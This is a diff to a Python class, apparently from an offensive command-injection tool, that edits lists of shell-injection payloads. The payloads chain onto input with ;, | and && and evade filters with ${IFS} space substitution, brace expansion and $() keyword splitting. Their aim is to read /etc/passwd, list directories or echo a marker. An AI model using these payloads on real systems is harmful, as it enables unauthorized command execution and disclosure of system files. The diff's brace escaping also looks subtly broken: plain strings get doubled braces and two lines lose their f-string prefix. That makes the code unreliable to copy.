@@ -305,19 +305,19 @@ class GhostInjections:
                 "&wh$()oami",
                 "&i$()d",
                 # IFS bypass - space alternative
-                ";cat${IFS}/etc/passwd",
-                ";ls${IFS}-la",
-                f";echo${IFS}{self.session_marker}",
-                "|cat${IFS}/etc/passwd",
-                "&&cat${IFS}/etc/passwd",
-                ";c$()a$()t${IFS}/etc/passwd",
+                ";cat${{IFS}}/etc/passwd",
+                ";ls${{IFS}}-la",
+                f";echo${{IFS}}{self.session_marker}",
+                "|cat${{IFS}}/etc/passwd",
+                "&&cat${{IFS}}/etc/passwd",
+                ";c$()a$()t${{IFS}}/etc/passwd",
                 # Brace expansion bypass
                 ";{cat,/etc/passwd}",
                 ";{ls,-la}",
                 f";{{echo,{self.session_marker}}}",
                 # Combined bypasses
-                ";c$()a$()t${IFS}/etc/p$()asswd",
-                ";l$()s${IFS}-l$()a",
+                ";c$()a$()t${{IFS}}/etc/p$()asswd",
+                ";l$()s${{IFS}}-l$()a",
             ],
             "base64_bypass": [
                 # Base64 encoded payloads to bypass ALL filters
@@ -2055,11 +2055,11 @@ class GhostInjections:
         
         # IFS bypass payloads
         ifs_payloads = [
-            f";echo${{{IFS}}}{marker}",
-            f"|echo${{{IFS}}}{marker}",
-            f"&&echo${{{IFS}}}{marker}",
-            f";cat${{{IFS}}}/etc/passwd",
-            f";ls${{{IFS}}}-la",
+            f";echo${{IFS}}{marker}",
+            f"|echo${{IFS}}{marker}",
+            f"&&echo${{IFS}}{marker}",
+            ";cat${{IFS}}/etc/passwd",
+            ";ls${{IFS}}-la",
         ]
         
         for payload in ifs_payloads:
